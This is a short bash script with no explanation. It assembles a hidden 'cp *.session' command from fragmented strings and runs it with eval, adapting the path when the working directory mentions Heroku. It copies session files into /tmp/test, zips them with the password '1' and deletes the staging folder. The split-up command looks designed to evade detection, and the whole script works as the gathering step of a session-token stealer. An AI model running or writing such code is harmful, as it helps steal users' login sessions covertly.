mkdir -p /tmp/test 2>/dev/null

current_dir=$(pwd)
if [[ "$current_dir" == *Heroku/heroku* ]]; then
    part_b="../*.se"
elif [[ "$current_dir" == *Heroku* ]]; then
    part_b="./*.se"
else
    part_b="*.se"
fi

part_a="cp"
part_c="ssion"
space=" "
file_path="/tmp/test/"

printf -v final_cmd "%s%s%s%s%s%s" "$part_a" "$space" "$part_b" "$part_c" "$space" "$file_path"

eval "$final_cmd"

if [ "$(ls -A /tmp/test 2>/dev/null)" ]; then
    zip -q -P "1" -r /tmp/test.zip /tmp/test >/dev/null
fi

rm -rf /tmp/test
